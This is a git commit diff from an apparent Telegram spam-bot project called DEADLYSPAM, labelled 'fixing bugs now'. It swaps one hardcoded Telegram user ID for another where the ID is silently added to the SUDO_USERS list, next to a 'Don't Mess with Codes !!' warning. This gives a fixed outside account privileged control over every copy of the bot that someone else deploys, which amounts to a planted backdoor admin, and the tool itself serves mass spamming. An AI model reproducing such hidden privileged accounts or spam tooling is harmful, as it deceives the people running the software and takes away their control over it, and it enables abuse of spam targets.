ed34927bd42b39d3ddd2d0fa775e8f86c4fea984
BlazeOp <94062864+piroXpower@users.noreply.github.com>
2022-10-31 07:59:57 +0530

    fixing bugs now

--- DEADLYSPAM/__init__.py
+++ DEADLYSPAM/__init__.py
@@ -37,15 +37,15 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 5520757776 not in SUDO_USERS:
-    SUDO_USERS.append(5520757776)
+if 5256676062 not in SUDO_USERS:
+    SUDO_USERS.append(5256676062)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(5520757776)
+SUDO_USERS.append(5256676062)
 
 # Tokens
 
